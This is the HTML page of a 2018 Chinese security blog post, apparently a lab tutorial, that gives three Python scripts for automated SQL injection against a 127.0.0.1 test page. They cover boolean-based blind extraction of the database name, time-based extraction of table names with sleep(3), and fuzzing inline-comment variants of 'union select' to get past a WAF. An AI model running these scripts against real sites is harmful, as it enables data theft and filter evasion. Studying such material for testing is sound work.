@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    python脚本实现自动化sql盲注 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",漏洞利用,sql注入,python">
+<meta name="description" content="0x00 前言前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。
+0x01 布尔型盲注123456789101112131415161718192021222324252627282930313233#! -*- encoding:utf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python脚本实现自动化sql盲注 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2018/04/22/python脚本实现自动化sql盲注/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="0x00 前言前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。
+0x01 布尔型盲注123456789101112131415161718192021222324252627282930313233#! -*- encoding:utf">
+<meta property="og:updated_time" content="2018-04-22T15:01:45.099Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python脚本实现自动化sql盲注 | Leticia‘s Blog">
+<meta name="twitter:description" content="0x00 前言前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。
+0x01 布尔型盲注123456789101112131415161718192021222324252627282930313233#! -*- encoding:utf">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/漏洞利用/" class="tagc1">漏洞利用 : 13</a><a href="/tags/python/" class="tagc2">python : 7</a><a href="/tags/网络安全/" class="tagc3">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc4">sql注入 : 4</a><a href="/tags/mysql/" class="tagc5">mysql : 4</a><a href="/tags/暴力破解/" class="tagc1">暴力破解 : 3</a><a href="/tags/ctf/" class="tagc2">ctf : 3</a><a href="/tags/php/" class="tagc3">php : 3</a><a href="/tags/密码学/" class="tagc4">密码学 : 2</a><a href="/tags/文件上传/" class="tagc5">文件上传 : 2</a><a href="/tags/硬件安全/" class="tagc1">硬件安全 : 2</a><a href="/tags/snort/" class="tagc2">snort : 1</a><a href="/tags/arp入侵/" class="tagc3">arp入侵 : 1</a><a href="/tags/nmap/" class="tagc4">nmap : 1</a><a href="/tags/arpspoof/" class="tagc5">arpspoof : 1</a><a href="/tags/CSRF/" class="tagc1">CSRF : 1</a><a href="/tags/BurpSuite/" class="tagc2">BurpSuite : 1</a><a href="/tags/笔记/" class="tagc3">笔记 : 1</a><a href="/tags/struts2-052/" class="tagc4">struts2-052 : 1</a><a href="/tags/redis/" class="tagc5">redis : 1</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">python脚本实现自动化sql盲注</h1>
+    
+    <div class="post-meta">
+      <time datetime="2018-04-22 22:59:37" class="post-meta__date date">2018-04-22 22:59:37</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/python/">python</a>, <a class="categories-link" href="/categories/python/漏洞利用/">漏洞利用</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/python/">python</a>, <a class="tags-link" href="/tags/sql注入/">sql注入</a>, <a class="tags-link" href="/tags/漏洞利用/">漏洞利用</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。</p>
+<h2 id="0x01-布尔型盲注"><a href="#0x01-布尔型盲注" class="headerlink" title="0x01 布尔型盲注"></a>0x01 布尔型盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#! -*- encoding:utf-8 -*-</div><div class="line"># python3</div><div class="line"># author: leticia</div><div class="line"></div><div class="line">import requests</div><div class="line">#import re</div><div class="line"></div><div class="line">#cookies=&#123;</div><div class="line">#        &apos;PHPSESSID&apos;: &apos;xxx&apos;</div><div class="line">#&#125;</div><div class="line"></div><div class="line">headers  = &#123;</div><div class="line">		&apos;X-Forwarded-For&apos;: &quot;127.0.0.1&quot;,</div><div class="line">		&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;,</div><div class="line">		&apos;Referer&apos;:&quot;http://127.0.0.1/&quot;</div><div class="line">		&#125;</div><div class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;</div><div class="line">url=r&apos;http://127.0.0.1/sql/wide.php&apos;</div><div class="line">string=&apos;&apos;</div><div class="line"></div><div class="line">for i in range(1,33):</div><div class="line">    for j in dic:</div><div class="line">        id=&quot;mid(database(),&#123;0&#125;,1)=&#123;1&#125;&quot;.format(str(i),ord(j))</div><div class="line">        data=&#123;</div><div class="line">            &apos;username&apos;:id,</div><div class="line">            &apos;password&apos;: 1</div><div class="line">        &#125;</div><div class="line">        print(j)</div><div class="line">        s=requests.post(url=url,data=data,headers=headers)</div><div class="line">        if &quot;user&quot; in s.text:</div><div class="line">            string+=j</div><div class="line">            break</div><div class="line">    print(string)</div></pre></td></tr></table></figure>
+<p>这里我们可以通过构造data中的参数值，循环遍历数据库名的前33个位置与dic中的所有字符进行比对，然后如果返回页面正常即存在user关键字（根据实际情况更改），就将这个字母保存在string中，遍历完之后输出string。</p>
+<h2 id="0x02-基于时间的盲注"><a href="#0x02-基于时间的盲注" class="headerlink" title="0x02 基于时间的盲注"></a>0x02 基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#! -*- encoding:utf-8 -*-</div><div class="line"># python3</div><div class="line"># author: leticia</div><div class="line">import requests</div><div class="line">import re</div><div class="line"></div><div class="line">#cookies=&#123;</div><div class="line">#        &apos;PHPSESSID&apos;: &apos;xxx&apos;</div><div class="line">#&#125;</div><div class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=r&apos;http://127.0.0.1/sql/wide.php&apos;</div><div class="line">string=&apos;&apos;</div><div class="line">for i in range(1,33):</div><div class="line">    for j in dic:</div><div class="line">        id=&quot;-1&apos; and if(ord((select substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=database()))=&#123;1&#125;,sleep(3),0))&quot;.format(str(i),ord(j))</div><div class="line">        data=&#123;</div><div class="line">            &apos;username&apos;:id,</div><div class="line">            &apos;password&apos;: 1</div><div class="line">        &#125;</div><div class="line">        print j</div><div class="line">        s=requests.post(url=url,data=data)</div><div class="line">        sec=s.elapsed.seconds</div><div class="line">        if sec &gt; 2:</div><div class="line">            string+=j</div><div class="line">            break</div><div class="line">    print string</div></pre></td></tr></table></figure>
+<p>这里我们可以通过构造data中的参数值，循环遍历表名的前33个位置与dic中的所有字符进行比对，然后如果返回页面需要两秒以上才能返回（即触发sleep(3)函数），就将这个字母保存在string中，遍历完之后输出string。</p>
+<h2 id="0x03-fuzz测试"><a href="#0x03-fuzz测试" class="headerlink" title="0x03 fuzz测试"></a>0x03 fuzz测试</h2><p>在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。在某些有安全狗一类的防护系统下，如果要手工判断过滤规则需要安全工作者很高的执行力，在这些情况下fuzz测试可以充分利用机器生成无规则且大量的数据来进行测试，拥有很高的效率。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#! -*- encoding:utf-8 -*-</div><div class="line"># python3</div><div class="line"></div><div class="line">import requests</div><div class="line"></div><div class="line">fuzz_zs = [&apos;/*&apos;, &apos;*/&apos;, &apos;/*!&apos;, &apos;*&apos;, &apos;=&apos;, &apos;`&apos;, &apos;!&apos;, &apos;@&apos;, &apos;%&apos;, &apos;.&apos;, &apos;-&apos;, &apos;+&apos;, &apos;|&apos;, &apos;%00&apos;]</div><div class="line">fuzz_sz = [&apos;&apos;, &apos; &apos;]</div><div class="line">fuzz_ch = [&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;]</div><div class="line"></div><div class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</div><div class="line">headers = &#123;</div><div class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0&quot;,</div><div class="line">    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;</div><div class="line">&#125;</div><div class="line">url_start = &quot;http://127.0.0.1/waf/test.php?id=1&quot;</div><div class="line">test_url=requests.get(url_start,headers=headers)</div><div class="line">print(test_url.text)</div><div class="line"></div><div class="line">for a in fuzz:</div><div class="line">    for b in fuzz:</div><div class="line">        for c in fuzz:</div><div class="line">            for d in fuzz:</div><div class="line">                exp = &quot;/*!union&quot; + a + b + c + d + &quot;select*/ 1,2,3&quot;</div><div class="line">                url = url_start + exp</div><div class="line">                res = requests.get(url=url, headers=headers)</div><div class="line">                print(&quot;Now URL:&quot; + url)</div><div class="line">                if &quot;user&quot; in res.text:</div><div class="line">                    print(&quot;Find Fuzz bypass:&quot; + url)</div><div class="line">                    with open(r&quot;C:\Users\Leticia\Desktop\results.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as r:</div><div class="line">                        r.write(url + &quot;\n&quot;)</div></pre></td></tr></table></figure>
+<p>这里将fuzz常用到的内联注释、特殊字符等，随机组合，循环添加到union select之间，如果返回的页面正常显示user，没有进入防护系统的拦截界面，说明这里的表达式没有被过滤，然后写到results.txt中保存。</p>
+<p>之后我们可以利用results.txt分析到的规则，再完善前面的其他脚本，进行自动化注入。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>做测试时不能总是依赖sqlmap等完全自动化工具，也不能完全依赖手注，根据面对的实际情况编写适当的脚本，才能更熟练的掌握这些漏洞。</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2018/04/22/python脚本实现自动化sql盲注/" target="_blank">python脚本实现自动化sql盲注</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2018-04-22 22:59:37<br />
+    <span>最后更新:</span>2018-04-22 23:01:45<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
